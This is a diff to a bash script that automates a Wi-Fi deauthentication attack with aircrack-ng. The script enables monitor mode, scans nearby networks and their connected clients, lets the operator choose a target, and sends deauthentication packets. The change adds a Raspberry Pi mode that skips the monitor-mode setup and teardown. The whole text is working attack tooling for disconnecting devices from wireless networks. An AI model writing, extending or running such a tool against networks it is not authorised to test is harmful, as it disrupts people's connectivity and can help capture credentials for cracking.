@@ -114,8 +114,10 @@ cleanup() {
 stop_attack() {
   echo -e "${bold}${yellow}Stopping the deauthentication attack...${normal}"
   kill $AIREPLAY_PID
-  echo -e "${bold}${yellow}Disabling monitor mode on $MONITOR_INTERFACE...${normal}"
-  airmon-ng stop $MONITOR_INTERFACE
+  if [ "$1" != "rpi" ]; then
+    echo -e "${bold}${yellow}Disabling monitor mode on $MONITOR_INTERFACE...${normal}"
+    airmon-ng stop $MONITOR_INTERFACE
+  fi
   cleanup
   echo -e "${bold}${green}Attack stopped and monitor mode disabled.${normal}"
   exit 0
@@ -202,7 +204,9 @@ scan_for_clients() {
 
   if [ ${#clients[@]} -eq 0 ]; then
     echo -e "${bold}${red}No clients found. Exiting.${normal}"
-    airmon-ng stop $MONITOR_INTERFACE
+    if [ "$1" != "rpi" ]; then
+      airmon-ng stop $MONITOR_INTERFACE
+    fi
     cleanup
     exit 1
   fi
@@ -213,7 +217,9 @@ scan_for_clients() {
 
   if [ -z "${clients[$client_num]}" ]; then
     echo -e "${bold}${red}Invalid selection. Exiting.${normal}"
-    airmon-ng stop $MONITOR_INTERFACE
+    if [ "$1" != "rpi" ]; then
+      airmon-ng stop $MONITOR_INTERFACE
+    fi
     cleanup
     exit 1
   fi
@@ -225,7 +231,7 @@ scan_for_clients() {
 set_colors
 
 # Trap CTRL+C (SIGINT) to stop the attack gracefully
-trap stop_attack SIGINT
+trap 'stop_attack "$1"' SIGINT
 
 # Check if running as root
 if [ "$EUID" -ne 0 ]; then
@@ -242,8 +248,10 @@ display_header
 # Kill interfering processes
 kill_interfering_processes
 
-# Stop interfaces in monitor mode
-stop_monitor_mode_interfaces
+# Stop interfaces in monitor mode (only if not RPi)
+if [ "$1" != "rpi" ]; then
+  stop_monitor_mode_interfaces
+fi
 
 # List wireless interfaces and let the user pick one
 list_wireless_interfaces
@@ -265,12 +273,16 @@ CHANNEL=""          # Channel of the target network
 BSSID=""            # BSSID of the target network
 MONITOR_INTERFACE=""
 
-# Step 1: Enable monitor mode
-echo -e "${bold}${green}Enabling monitor mode on $INTERFACE...${normal}"
-airmon-ng start $INTERFACE
+# Step 1: Enable monitor mode (only if not RPi)
+if [ "$1" != "rpi" ]; then
+  echo -e "${bold}${green}Enabling monitor mode on $INTERFACE...${normal}"
+  airmon-ng start $INTERFACE
 
-# Get the monitor mode interface name (e.g., wlan0mon)
-MONITOR_INTERFACE=$(iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}')
+  # Get the monitor mode interface name (e.g., wlan0mon)
+  MONITOR_INTERFACE=$(iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}')
+else
+  MONITOR_INTERFACE="$INTERFACE"
+fi
 
 # Step 2: Scan for networks to get BSSID and channel
 echo -e "${bold}${green}Scanning for networks (will stop automatically after 1 minute)...${normal}"
@@ -299,7 +311,9 @@ done < filtered_scan_results.csv
 
 if [ ${#networks[@]} -eq 0 ]; then
   echo -e "${bold}${red}No networks found. Exiting.${normal}"
-  airmon-ng stop $MONITOR_INTERFACE
+  if [ "$1" != "rpi" ]; then
+    airmon-ng stop $MONITOR_INTERFACE
+  fi
   cleanup
   exit 1
 fi
@@ -311,7 +325,9 @@ read -r network_num
 
 if [ -z "${networks[$network_num]}" ]; then
   echo -e "${bold}${red}Invalid selection. Exiting.${normal}"
-  airmon-ng stop $MONITOR_INTERFACE
+  if [ "$1" != "rpi" ]; then
+    airmon-ng stop $MONITOR_INTERFACE
+  fi
   cleanup
   exit 1
 fi
@@ -323,7 +339,7 @@ echo -e "${bold}${green}Setting the channel to $CHANNEL...${normal}"
 iwconfig $MONITOR_INTERFACE channel $CHANNEL
 
 # Step 3.5: Scan for clients connected to the selected network
-scan_for_clients
+scan_for_clients "$1"
 
 # Step 4: Send deauthentication packets
 echo -e "${bold}${green}Sending deauthentication packets to client $CLIENT_MAC...${normal}"
